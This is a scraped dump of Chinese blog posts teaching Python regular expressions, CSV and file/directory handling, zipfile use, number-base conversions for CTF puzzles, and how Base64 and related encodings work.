**()**——括号，表达式分组（第n组，n=1，2，3….99，从左往右数），并形成子表达式 (?P)——拥有括号的功能，但能为该分组再指定一个自定名字 (?P=name)——引用分配过名字的分组，但没有分组功能 **|**——或，左右规则任意匹配一个，从左往右尝试匹配，一旦成功就跳过后面的规则。|没被包在括号中间的话它的作用域是整个表达式，被包的话作用域在括号内 \\——反斜杠，后接功能字有符转义功能，后接数字（1到99）有引用分组的功能，后接某些字母又有特殊功能 1234r&#39;abc|def|ghi&#39;#匹配abc或def或ghir&#39;ma(?:k|d)e&#39;#匹配make或mader&#39;(abc)def\\1&#39;#相当于r&#39;(abc)defabc&#39;,匹配abcdefabcr&#39;(?P&lt;ok&gt;abc)f(?P&#x3D;ok)&#39;#为(abc)子组分配了“ok”的名字，然后再引用，匹配abcfabc 边界匹配 ^——放在表达式的最前面，作用域是表达式，在多行模式中，在每一行匹配字符串开头（多行模式要手动开启，否则和\\A没什么区别） $——放在表达式的最后面，作用域是表达式，在多行模式中，在每一行匹配字符串末尾（多行模式要手动开启，否则和\\Z没什么区别） \\A——放在表达式的最前面，作用域是表达式，匹配字符串开头，不能多行匹配 \\Z——放在表达式的最后面，作用域是表达式，匹配字符串末尾，不能多行匹配 \\b——不匹配字符，只匹配一个边界，匹配\\w和\\W或\\W和\\w的边界（单词字符和非单词字符的边界） \\B——不匹配字符，只匹配一个边界，与\\b相反，匹配\\w和\\w或\\W和\\W的边界 123456r&#39;^abc|^def&#39;#匹配abc开头或def开头，开启了多行模式时，对字符串&#39;abcd\\ndefh&#39;能匹配出abc，def两个r&#39;abc$|def$&#39;#匹配abc结尾或def结尾，开启了多行模式时，对字符串&#39;0abc\\n0def&#39;能匹配出abc，def两个r&#39;\\Aabc&#39;#匹配abc开头，因为不能多行匹配，就算开启多行模式，对字符串&#39;abcd\\nabcd&#39;只能匹配到前面的abc#\\Z同理r&#39;\\w\\b\\W&#39;#匹配“单词字符+非单词字符”的结构如&#39;a!&#39;,&#39;1%&#39;#\\B同理 re模块中的函数re.match函数match 方法用于查找字符串的头部（也可以指定起始位置），它是一次匹配，只要找到了一个匹配的结果就返回，而不是查找所有匹配的结果。 一次匹配，只要找到就返回找到的结果。 re.findall函数找出所有满足条件的，返回的是一个列表。 match 和 search 方法都是一次匹配，只要找到了一个匹配的结果就返回。然而，在大多数时候，我们需要搜索整个字符串，获得所有匹配的结果。 re.sub函数用来替换字符串。将匹配到的字符串替换为其他字符串。 取回匹配的数据在正则表达式中，可以对过滤到的字符串进行分组。分组使用圆括号的方式。将每一个正则表达式使用括号括起来。 123group()：和group(0)是等价的，返回的是整个满足条件的字符串。groups()：返回的是里面的子组。索引从1开始。group(n)：返回的是第一个子组，可以传入多个。 r Python中字符串前面加上 r 表示原生字符串 。 贪婪模式与非贪婪模式贪婪模式：正则表达式会匹配尽量多的字符。默认是贪婪模式。 非贪婪模式：正则表达式会尽量少的匹配字符。 贪婪模式 1(&#39;&lt;div class&#x3D;&quot;cont&quot;&gt;.*&lt;b&gt;(.*)&lt;&#x2F;b&gt;&#39;,text,re.DOTALL) 非贪婪模式 1(&#39;&lt;div class&#x3D;&quot;cont&quot;&gt;.*?&lt;b&gt;(.*)&lt;&#x2F;b&gt;&#39;,text,re.DOTALL) 可以看到非贪婪模式使用?表示只匹配一次或者匹配零次。 1234567import retext=&#x27;&lt;div class=&quot;cont&quot;&gt;&lt;p&gt;sdf&lt;/p&gt;&lt;b&gt;steady&lt;/b&gt;&lt;b&gt;s1eady&lt;/b&gt;&#x27;print(text)resault=re.findall(r&#x27;&lt;div class=&quot;cont&quot;&gt;.*&lt;b&gt;(.*?)&lt;/b&gt;&#x27;,text,re.DOTALL)print(&quot;贪婪模式&quot; + str(resault))resault=re.findall(r&#x27;&lt;div class=&quot;cont&quot;&gt;.*?&lt;b&gt;(.*?)&lt;/b&gt;&#x27;,text,re.DOTALL)print(&quot;非贪婪模式&quot; + str(resault)) 输出 12贪婪模式[&#39;s1eady&#39;]非贪婪模式[&#39;steady&#39;] 可以看到主要是使用?匹配一次或者零次，来阻止贪婪模式。 例子1234import retest=&quot;steady&quot;resault=re.match(&#x27;[e]&#x27;,test)print(resault.group()) 输出： 1234Traceback (most recent call last): File &quot;/Users/apple/Desktop/steady.py&quot;, line 4, in &lt;module&gt; print(resault.group())AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;group&#x27; 1234import retest=&quot;steady&quot;resault=re.match(&#x27;[s]&#x27;,test)print(resault.group()) 输出： 1s 1234import retest=&quot;7667-786876&quot;resault=re.match(&#x27;[\\d]*&#x27;,test)print(resault.group()) 输出： 17667 1234import retest=&quot;7667-786876&quot;resault=re.match(&#x27;\\d+&#x27;,test)print(resault.group()) 输出： 17667 1234import retest=&quot;7667-786876&quot;resault=re.match(&#x27;\\d?&#x27;,test)print(resault.group()) 输出： 17 1234import retest=&quot;7667-786876&quot;resault=re.match(&#x27;\\d&#123;3&#125;&#x27;,test)print(resault.group()) 输出： 1766 1234import retest=&quot;7667-786876&quot;resault=re.match(&#x27;\\d&#123;0,10&#125;&#x27;,test)print(resault.group()) 输出： 17667 1234import retest=&quot;7667-786876&quot;resault=re.match(&#x27;^76&#x27;,test)print(resault.group()) 输出 176 1234import retest=&quot;7667-786876&quot;resault=re.match(&#x27;^763&#x27;,test)print(resault.group()) 输出 1234Traceback (most recent call last): File &quot;/Users/apple/Desktop/steady.py&quot;, line 4, in &lt;module&gt; print(resault.group())AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;group&#x27; 小案例身份证 前17位必须是数字，后一位可以是数字或者x或者X。 12345678import relists = [&#x27;370787199927261616&#x27;,&#x27;370787199927261614&#x27;,&#x27;3707871999272616SS&#x27;,&#x27;37078719992726162X&#x27;,&#x27;37078719992726D616&#x27;]for l in lists: resault=re.match(&#x27;\\d&#123;17&#125;[\\dxX]&#x27;,l) try: print(resault.group()) except: pass 手机号 第一位必须是1，一共十一位，无字母。 12345678import relists = [&#x27;19862123063&#x27;,&#x27;29862123063&#x27;,&#x27;198df123063&#x27;,&#x27;1986212d063&#x27;,&#x27;198621230dd&#x27;,&#x27;1987261267171&#x27;]for l in lists: resault=re.match(&#x27;1\\d&#123;10&#125;&#x27;,l) try: print(resault.group()) except: pass 网站URL 12345678import relists = [&#x27;http://www.steady.com&#x27;,&#x27;https://www.steady.com&#x27;,&#x27;http:/www.steady.com&#x27;,&#x27;http://www.steady.top&#x27;,&#x27;http://ww.ls.com&#x27;,&#x27;http://www.dd.com&#x27;,&#x27;ftp://www.steady.com&#x27;]for l in lists: resault=re.match(&#x27;(ftp|http|https)://.*.(com|top)$&#x27;,l) try: print(resault.group()) except: pass csv文件处理读取csv文件表头不作为第一行 123import pandas as pddata &#x3D; pd.read_csv(&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;huazhu.com.csv&quot;)print(data) 表头作为第一行 123import pandas as pddata &#x3D; pd.read_csv(&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;huazhu.com.csv&quot;,header&#x3D;None)print(data) 获取数据获取指定列的数据，并存入一个数组中。 从文件中取出url并写入一个文件。 123456789import pandas as pdimport numpy as npdata = pd.read_csv(&quot;/Users/apple/Desktop/huazhu.com.csv&quot;)url = data[&quot;url&quot;]url_list = np.array(url)with open(&#x27;/Users/apple/Desktop/huazhu_url.txt&#x27;,&#x27;w&#x27;) as fp: for i in url_list: print(i) fp.write(i+&quot;\\n&quot;)","categories":[{"name":"Python学习","slug":"Python学习","permalink":"http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://s1eady.top/tags/Python/"}]},{"title":"Python学习--Python文件操作","slug":"Python文件操作","date":"2018-12-01T19:22:45.000Z","updated":"2020-10-16T11:36:51.765Z","comments":true,"path":"2018/12/02/Python文件操作/","link":"","permalink":"http://s1eady.top/2018/12/02/Python%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","excerpt":"","text":"Python文件操作Python中文件数据的读和写open()方法两个参数 mode(模式)和encoding(编码)。 encoding一般来说，打开文件的编码方式以操作系统的默认编码为准，中文可能会出现乱码，需要加encoding=’utf-8’。 123with open(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.txt&#39;,&#39;r&#39;,encoding&#x3D;&#39;utf-8&#39;) as fp: a&#x3D;fp.readlines() print(a) mode，它指定文件打开的模式 12345678910111213141516&#39;r&#39;： 以只读模式打开（缺省模式，必须保证文件存在）&#39;w&#39;：以只写模式打开。若文件存在，则清空文件，然后重新创建；若不存在，则新建&#39;a&#39;：以追加模式打开。若文件存在，则会追加到文件的末尾；若文件不存在，则新建常见的mode组合&#39;r&#39;或&#39;rt&#39;： 默认模式，文本读模式&#39;w&#39;或&#39;wt&#39;：以文本写模式打开（打开前文件被清空）&#39;rb&#39;： 以二进制读模式打开&#39;ab&#39;： 以二进制追加模式打开&#39;wb&#39;： 以二进制写模式打开（打开前文件被清空）&#39;r+&#39;： 以文本读写模式打开，默认写的指针开始指在文件开头, 因此会覆写文件&#39;w+&#39;： 以文本读写模式打开（打开前文件被清空）&#39;a+&#39;： 以文本读写模式打开（只能写在文件末尾）&#39;rb+&#39;： 以二进制读写模式打开&#39;wb+&#39;： 以二进制读写模式打开（打开前被清空）&#39;ab+&#39;： 以二进制读写模式打开 读文件123with open(&#39;data.txt&#39;, &#39;r&#39;) as f: data &#x3D; f.read() print(&#39;context: &#123;&#125;&#39;.format(data)) file.read([size])从文件读取指定的字节数，如果未给定或为负则读取所有。 file.readline([size])读取整行，包括 “\\n” 字符，readline()读取第一行就返回，再次调用f.readline()，会读取下一行。 file.readlines([sizeint]) 常与for循环和strip()去掉换行符配合。 读取所有行并返回列表，若给定sizeint&gt;0，则是设置一次读多少字节，这是为了减轻读取压力。 12345678910111213141516171819202122232425262728In [47]: with open(&#x27;test.txt&#x27;,&#x27;r&#x27;) as f: ...: print(f.read())1 is everything.python is a cat.this is the end.In [48]: with open(&#x27;test.txt&#x27;,&#x27;r&#x27;) as f: ...: print(f.readlines())[&#x27;1 is everything.\\n&#x27;, &#x27;python is a cat.\\n&#x27;, &#x27;this is the end.&#x27;]In [49]: with open(&#x27;test.txt&#x27;,&#x27;r&#x27;) as f: ...: print(f.readline())1 is everything.In [61]: with open(&#x27;test.txt&#x27;,&#x27;r&#x27;) as f: ...: for line in f.readlines(): ...: print(line)1 is everything.python is a cat.this is the end.# 读取内容包含换行符，所以要strip()去掉换行符In [62]: with open(&#x27;test.txt&#x27;,&#x27;r&#x27;) as f: ...: for line in f.readlines(): ...: print(line.strip())1 is everything.python is a cat.this is the end. 写文件123with open(&#39;data.txt&#39;, &#39;w&#39;) as f: data &#x3D; &#39;some data to be written to the file&#39; f.write(data) 获取目录列表os.scandir()os.scandir() 调用时返回一个迭代器而不是一个列表。 1234import osentries &#x3D; os.scandir(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)print(entries)# &lt;posix.ScandirIterator at 0x105b4d4b0&gt; ScandirIterator 指向了当前目录中的所有条目。你可以遍历迭代器的内容，并打印文件名。 1234import oswith os.scandir(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;) as entries: for entry in entries: print(entry.name) 12345678910111213141516171819202122➜ Desktop python3 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py.DS_Store阅读笔记.md.localized常用操作huazhu.com.csvhuazhu_url.txtcodesteady-learnvulhub-master未命名 2.txtPHP木马.mdjava基础.md1.pymakedownSQL server.md开发学习sqlmap使用以及学习.mdSQL注入漏洞挖掘.mdIPC.mdPython爬虫.md漏洞盒子 这里 os.scandir() 和with语句一起使用，因为它支持上下文管理协议。使用上下文管理器关闭迭代器并在迭代器耗尽后自动释放获取的资源。 pathlib获取目录列表的方法是使用 pathlib 模块： 12345from pathlib import Pathentries &#x3D; Path(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)for entry in entries.iterdir(): print(entry.name) pathlib.Path() 返回的是 PosixPath 或 WindowsPath 对象，这取决于操作系统。 pathlib.Path() 对象有一个 .iterdir() 的方法用于创建一个迭代器包含该目录下所有文件和目录。由 .iterdir() 生成的每个条目都包含文件或目录的信息，例如其名称和文件属性。pathlib 在Python3.4时被第一次引入，并且是对Python一个很好的加强，它为文件系统提供了面向对象的接口。 在上面的例子中，你调用 pathlib.Path() 并传入了一个路径参数。然后调用 .iterdir() 来获取 my_directory 下的所有文件和目录列表。 总结 函数 描述 os.listdir() 以列表的方式返回目录中所有的文件和文件夹 os.scandir() 返回一个迭代器包含目录中所有的对象，对象包含文件属性信息 pathlib.Path().iterdir() 返回一个迭代器包含目录中所有的对象，对象包含文件属性信息 获取目录中的文件打印出目录中文件的名称。为了过滤目录并仅列出 os.listdir() 生成的目录列表的文件，要使用 os.path ： 1234567import osbasepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;for entry in os.listdir(basepath): # 使用os.path.isfile判断该路径是否是文件类型 if os.path.isfile(os.path.join(basepath, entry)): print(entry) 123456789101112131415➜ ~ python3 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py.DS_Store阅读笔记.md.localizedhuazhu.com.csvhuazhu_url.txt未命名 2.txtPHP木马.mdjava基础.md1.pySQL server.mdsqlmap使用以及学习.mdSQL注入漏洞挖掘.mdIPC.mdPython爬虫.md 在这里调用 os.listdir() 返回指定路径中所有内容的列表，接着使用 os.path.isfile() 过滤列表让其只显示文件类型而非目录类型。 一个更简单的方式来列出一个目录中所有的文件是使用 os.scandir() 或 pathlib.Path() : 1234567import osbasepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;with os.scandir(basepath) as entries: for entry in entries: if entry.is_file(): print(entry.name) pathlib.Path() 列出一个目录中的文件： 123456from pathlib import Pathbasepath &#x3D; Path(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)for entry in basepath.iterdir(): if entry.is_file(): print(entry.name) 列出子目录os.listdir() 和 os.path() : 123456import osbasepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;for entry in os.listdir(basepath): if os.path.isdir(os.path.join(basepath, entry)): print(entry) os.scandir() ： is_dir() 返回 True，否侧返回False 1234567import osbasepath &#x3D; &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;with os.scandir(basepath) as entries: for entry in entries: if entry.is_dir(): print(entry.name) pathlib.Path() ： 123456from pathlib import Pathbasepath &#x3D; Path(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;)for entry in basepath.iterdir(): if entry.is_dir(): print(entry.name) 在 .iterdir() 迭代器返回的每一项上调用 is_dir() 检查是文件还是目录。 获取文件属性os.scandir() 和 pathlib.Path() 能直接获取到包含文件属性的目录列表。 1234567891011121314import oswith os.scandir(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#39;) as entries: for entry in entries: info &#x3D; entry.stat() print(info.st_mtime) &quot;&quot;&quot;1548163662.39526651548163689.19820621548163697.91759041548163721.18410281548163740.7651621548163769.4702623&quot;&quot;&quot; os.scandir() 返回一个 ScandirIterator 对象。ScandirIterator 对象中的每一项有 .stat() 方法能获取关于它指向文件或目录的信息。 .stat() 提供了例如文件大小和最后修改时间的信息。 创建目录 方法 描述 os.mkdir() 创建单个子目录 os.makedirs() 创建多个目录，包括中间目录 Pathlib.Path.mkdir() 创建单个或多个目录 创建单个目录要创建单个目录，把目录路径作为参数传给 os.mkdir() : 123import osos.mkdir(&#x27;/steady/1.php&#x27;) 如果该目录已经存在，os.mkdir() 将抛出 FileExistsError 异常。或者，你也可以使用 pathlib 来创建目录: 1234from pathlib import Pathp = Path(&#x27;example_directory&#x27;)p.mkdir() 如果路径已经存在，mkdir() 会抛出 FileExistsError 异常: 1FileExistsError: [Errno 17] File exists: &#39;example_directory&#39; 为了避免像这样的错误抛出， 当发生错误时捕获错误并让你的用户知道: 1234567from pathlib import Pathp = Path(&#x27;example_directory&#x27;)try: p.mkdir()except FileExistsError as e: print(e) 创建多个目录os.makedirs() 和 os.mkdir() 类似。两者之间的区别在于，os.makedirs() 不仅可以创建单独的目录，还可以递归的创建目录树。 123import osos.makedirs(&#x27;2018/10/05&#x27;, mode=0o770) 上述代码创建了 2018/10/05 的目录结构并为所有者和组用户提供读、写和执行权限。默认的模式为 0o777 ，增加了其他用户组的权限。 遍历目录和处理文件Python函数 os.walk() 来实现这一功能。os.walk() 用于通过从上到下或从下到上遍历树来生成目录树中的文件名。 os.walk() 默认是从上到下遍历目录: 12345import osfor dirpath, dirname, files in os.walk(&#x27;目录位置&#x27;): print(f&#x27;Found directory: &#123;dirpath&#125;&#x27;) for file_name in files: print(file_name) os.walk() 在每个循环中返回三个值： 当前文件夹的名称 当前文件夹中子文件夹的列表 当前文件夹中文件的列表 在每次迭代中，会打印出它找到的子目录和文件的名称： 1234567891011121314Found directory: /Users/apple/Desktop/steady-learn/笔记/漏洞原理/SQL/Mysql注入学习/sql注入题.DS_StoreSQL注入--8.mdSQL注入--3.mdSQL注入--6.mdSQL注入--2.mdSQL注入--5.mdSQL注入--1.mdSQL注入--4.mdFound directory: /Users/apple/Desktop/steady-learn/笔记/漏洞原理/SQL/Mysql注入学习/sql注入SQL注入--过滤空格.mdSQL注入--过滤and、or.md.DS_StoreSQL注入--字符型和数字型注入的判断.md 复制文件shutil.copy()使用shutil.copy() 将文件从一个位置复制到另一个位置 12345import shutilsrc &#x3D; &#39;path&#x2F;to&#x2F;file.txt&#39;dst &#x3D; &#39;path&#x2F;to&#x2F;dest_dir&#39;shutil.copy(src, dst) shutil.copy(src，dst) 会将文件 src 复制到 dst 中指定的位置。 如果 dst 是文件，则该文件的内容将替换为 src 的内容。 如果 dst 是目录，则 src 将被复制到该目录中。 shutil.copy() 仅复制文件的内容和文件的权限。 其他元数据（如文件的创建和修改时间）不会保留。 shutil.copy2()复制时保留所有文件元数据 移动文件和目录要将文件或目录移动到其他位置，请使用 shutil.move(src，dst) 。 123import shutildst &#x3D; shutil.move(&#39;dir_1&#x2F;&#39;, &#39;backup&#x2F;&#39;)print(dst) # &#39;backup&#39; 如果 backup/ 存在，则 shutil.move(&#39;dir_1/&#39;，&#39;backup/&#39;) 将 dir_1/ 移动到 backup/ 。 如果 backup/ 不存在，则 dir_1/ 将重命名为 backup 。 重命名文件和目录Python包含用于重命名文件和目录的 os.rename(src，dst)： 12import osos.rename(&#39;first.zip&#39;, &#39;first_01.zip&#39;) 上面的行将 first.zip 重命名为 first_01.zip 。 如果目标路径指向目录，则会抛出 OSError 。 读取ZIP文件zipfile 模块是一个底层模块，是Python标准库的一部分。 zipfile 具有可以轻松打开和提取ZIP文件的函数。 要读取ZIP文件的内容，首先要做的是创建一个 ZipFile 对象。ZipFile 对象类似于使用 open() 创建的文件对象。ZipFile 也是一个上下文管理器，因此支持with语句： 打开ZIP文件后，可以通过 zipfile 模块提供的函数访问有关存档文件的信息。 要获取存档文件中的文件列表，请在 ZipFile 对象上调用 namelist() ： 123456import zipfilewith zipfile.ZipFile(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;makedown.zip&#39;, &#39;r&#39;) as fp: a&#x3D;fp.namelist() for i in a: print(i) .namelist() 返回存档文件中文件和目录的名称列表。要检索有关存档文件中文件的信息，使用 .getinfo() ： 12345import zipfilewith zipfile.ZipFile(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;makedown.zip&#39;, &#39;r&#39;) as zipobj: bar_info &#x3D; zipobj.getinfo(&#39;makedown&#x2F;8B77F3C7-DC39-48C0-99C5-4CC7B1C123AC.png&#39;) print(bar_info.file_size) .getinfo() 返回一个 ZipInfo 对象，该对象存储有关存档文件的单个成员的信息。 要获取有关存档文件中文件的信息，请将其路径作为参数传递给 .getinfo() 。 使用 getinfo() ，你可以检索有关存档文件成员的信息，例如上次修改文件的日期，压缩大小及其完整文件名。 访问 .file_size 将以字节为单位检索文件的原始大小。 提取ZIP文件zipfile 模块允许你通过 .extract() 和 .extractall() 从ZIP文件中提取一个或多个文件。 默认情况下，这些方法将文件提取到当前目录。 它们都采用可选的路径参数，允许指定要将文件提取到的其他指定目录。 如果该目录不存在，则会自动创建该目录。 要从压缩文件中提取文件，请执行以下操作： 提取所有文件 1234import zipfileimport osdata_zip &#x3D; zipfile.ZipFile(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;makedown.zip&#39;, &#39;r&#39;)data_zip.extractall(path&#x3D;&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1&#39;) 提取某一个文件到当前目录下 1data_zip.extract(&#39;file1.py&#39;) 从加密的文档提取数据zipfile 支持提取受密码保护的ZIP。 要提取受密码保护的ZIP文件，请将密码作为参数传递给 .extract() 或.extractall() 方法： 12345&gt;&gt;&gt; import zipfile&gt;&gt;&gt; with zipfile.ZipFile(&#39;secret.zip&#39;, &#39;r&#39;) as pwd_zip:... # 从加密的文档提取数据... pwd_zip.extractall(path&#x3D;&#39;extract_dir&#39;, pwd&#x3D;&#39;Quish3@o&#39;) 将以读取模式打开 secret.zip 存档。 密码提供给 .extractall() ，并且压缩文件内容被提取到 extract_dir 。 由于with语句，在完成提取后，存档文件会自动关闭。","categories":[{"name":"Python学习","slug":"Python学习","permalink":"http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://s1eady.top/tags/Python/"}]},{"title":"CTF-python","slug":"CTF-Python","date":"2018-11-29T18:13:29.000Z","updated":"2020-10-16T11:36:24.414Z","comments":true,"path":"2018/11/30/CTF-Python/","link":"","permalink":"http://s1eady.top/2018/11/30/CTF-Python/","excerpt":"","text":"CTF中的Pythonstr 与 bytes 之间的类型转换str 与 bytes 之间的类型转换如下： str ⇒ bytes：bytes(s, encoding=&#39;utf8&#39;) bytes ⇒ str：str(b, encoding=&#39;utf-8&#39;) str.encode(s) bytes.decode(b) 12345678910111213141516171819# bytes object b = b&quot;example&quot; # str object s = &quot;example&quot; # str to bytes bytes(s, encoding = &quot;utf8&quot;) # bytes to str str(b, encoding = &quot;utf-8&quot;) # an alternative method # str to bytes str.encode(s) # bytes to str 进制转换1234二进制转换到十进制 int（&#x27;a&#x27;，2)八进制转换十六进制 hex(&#x27;a&#x27;)十进制转换二进制 bin(&#x27;a&#x27;)十六进制转换八进制 oct(&#x27;a&#x27;) int函数12345678a&#x3D;&quot;0x65&quot;print(int(a,16))b&#x3D;&quot;0o157&quot;print(int(b,8))c&#x3D;&quot;0o157&quot;print(int(c,8))d&#x3D;&quot;87&quot;print(int(d)) 十六进制转化1234567import binasciistr1=36427215695199a=hex(str1)print(a)b=a.strip(&#x27;0x&#x27;)c=binascii.unhexlify(b)print(c) 1)hex()会进行进制转换，转换结果会带有0x。而且hex只会处理数字，不能处理字符串。2)unhexlify()会将十六进制解码，不仅会处理数字，还会处理字符串。 二进制转换123456789g=&#x27;0110110101111001011011100110000101101101011001010110100101110011011010110110010101111001001000010010000100100001011010000110100001101000&#x27;b=&#x27;&#x27;e=0for i in range(len(g)): e+=1print(e)for i in range(0,136,8): b+=chr(int(g[i:i+8],2))print(b) 二进制八个一组转化为十进制，转换为ascii 八进制转化1234567a=&#x27;146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175&#x27;flag=&quot;&quot;l=len(a)print(a)for i in range(0,l,3): flag+=chr(int(a[i:i+3],8))print (flag) 常用小tripstartswith()函数：startswith() 作用：判断字符串是否以指定字符或子字符串开头。 语法：string.startswith(str, beg=0,end=len(string)) 返回值：如果检测到字符串，则返回True，否则返回False。默认空字符为True。 12345678910111213141516&gt;&gt;&gt; s = &#x27;hello good boy steady&#x27;&gt;&gt;&gt; print s.startswith(&#x27;h&#x27;)True&gt;&gt;&gt; print s.startswith(&#x27;hel&#x27;)True&gt;&gt;&gt; print s.startswith(&#x27;h&#x27;,4)False&gt;&gt;&gt; print s.startswith(&#x27;go&#x27;,6,8)True #匹配空字符集&gt;&gt;&gt; print s.startswith(&#x27;&#x27;)True#匹配元组&gt;&gt;&gt; print s.startswith((&#x27;t&#x27;,&#x27;b&#x27;,&#x27;h&#x27;))True 大小写转化1234steady_dic=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;steady_dic1=&quot;abcdefghijklmnopqrstuvwxyz&quot;print(steady_dic.lower())print(steady_dic1.upper()) 大小写字母123456789import stringwords1 = list(string.ascii_uppercase)print(words1)words2 = list(string.ascii_lowercase)print(words2)words3 = list(string.ascii_letters)print(words3) 正则表达式去除空格 1steady_str&#x3D;re.sub(r&quot; &quot;,&quot;&quot;,steady_str) 提取某些字符串 1steady_str&#x3D;re.findall(r&#39;&lt;(.*?)&lt;&#39;,steady_str) enumerate123iv&#x3D;[2,3,7,5,13,12,9,1,8,10,4,11,6]for x,y in enumerate(iv): print(x,y) 123456789101112130 21 32 73 54 135 126 97 18 89 1010 411 1112 6","categories":[{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/categories/CTF-%E5%AF%86%E7%A0%81/"}],"tags":[{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/tags/CTF-%E5%AF%86%E7%A0%81/"}]},{"title":"CTF-密码","slug":"CTF-密码题","date":"2018-11-22T00:24:33.000Z","updated":"2020-10-16T11:36:25.436Z","comments":true,"path":"2018/11/22/CTF-密码题/","link":"","permalink":"http://s1eady.top/2018/11/22/CTF-%E5%AF%86%E7%A0%81%E9%A2%98/","excerpt":"","text":"CTF密码题总结Base64原理Base64编码是基于64个字符A-Z,a-z，0-9，+，/的编码方式，因为2的6次方正好为64，所以就用6bit就可以表示出64个字符，eg:000000对应A，000001对应B。 每三个字符一组 1、每个字符转成八位二进制，一共是24位二进制。 2、24四位二进制转化成四个六位的二进制。 3、四个六位的二进制转化成十进制。 4、对应base64编码表将十进制转化成对应的字符。 特点 标准Base64只有64个字符（英文大小写、数字和+、/）以及用作后缀等号； Base64是把3个字节变成4个可打印字符，所以Base64编码后的字符串一定能被4整除（不算用作后缀的等号）； 等号一定用作后缀，且数目一定是0个、1个或2个。这是因为如果原文长度不能被3整除，Base64要在后面添加0凑齐3n位。为了正确还原，添加了几个0就加上几个等号。显然添加等号的数目只能是0、1或2； 严格来说Base64不能算是一种加密，只能说是编码转换。 12345678910111213141516171819202122232425262728293031323334353637383940import binasciiprint(&quot;制作base64编码表：&quot;)string_temp =&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;base64_dict = &#123;&#125;for i in range(64): base64_dict[i] = string_temp[i]print(base64_dict)s=[&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]a=&#x27;&#x27;string=&#x27;&#x27;for i in s: a+=str(ord(i)) b=bin(int(a))[2:] while len(b)!=8: a=&#x27;0&#x27; b=a+b string+=bprint(&quot;每三个字符转换成二进制:&quot;+string)h=&quot;&quot;hb=[]for i in range(0,25,6): h=string[i:i+6] hb.append(h)print(&quot;每三个八位二进制转化成四个六位二进制：&quot;)for i in hb: print(i)print(&quot;每六位二进制转化成十进制：&quot;)for i in hb: while &#x27;&#x27; in hb: hb.remove(&#x27;&#x27;) print(int(i,2))bs=&quot;&quot;print(&quot;十进制对应base64表转化：&quot;)for i in hb: i=int(i,2) if int(i)&gt;64: i=i%64 print(base64_dict[i]) bs+=base64_dict[i]print(bs) Python与Base64base64b64encode：b64encode 的参数 s 的类型必须是字节包（bytes）。 b64decode：b64decode 的参数 s 可以是字节包（bytes），也可以是字符串（str）。 编码字符串实例字符长度为能被3整除 字符串长度不能被3整除 加密1234import base64S = b&#x27;I like Python&#x27;steady = base64.b64encode(S)print(str(steady,encoding=&#x27;utf-8&#x27;)) 解密1234import base64S = &#x27;SSBsaWtlIFB5dGhvbg==&#x27;steady = base64.b64decode(S)print(str(steady,encoding=&#x27;utf-8&#x27;)) base32、16base32Base32使用了ASCII编码中可打印的32个字符**(大写字母A-Z和数字2~7)**对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组,由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位,则在编码后数据补充=,一个=相当于一个组(5个二进制位),编码后的数据是原先的五分之八倍。末尾最多有6个=。 base16Base16编码就是将ASCII字符集中可打印的字符**(数字0-9和字母A-F)**对应的二进制字节数据进行编码，不会出现=，数据量是原先的两倍。 base36Base36包含0~9的数字，加上所有26个字母，不区分大小写，不包含任何标点，所有的字母要不全大写，要不全小写。所以加起来就是 “0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ”,或者”0123456789abcdefghijklmnopqrstuvwxyz“ 特征特点：密文由36个字符（0-9,a-z）组成，加密仅支持整数数字，解密仅支持字符串，不支持中文密文由36个字符（0-9,A-Z） base58base58采用的字符集为“123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ”，从这不难看出，Base58是纯数字与字母组成而且去掉了容易引起视觉混淆的字符（0：数字零，O：大写O，I：大写i，l:小写L）。9个数字+49个字母=58个。由于没有特殊字符所以在采用鼠标双击或移动设备选择时可以自动识别全选。Base58本身就是URLSafe。Base64的URFSafe模式虽然已经对URL支持的比较好，但UUID中还是包含“-或_”。目前流行的比特币，采用的就是Base58Check编码，是在Base58基础上又增加了安全效验机制。 特征特点：Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”/”符号 base62同样的还有 base62编码，就是26个字母的大小写再加上0-9，一共62个字符。 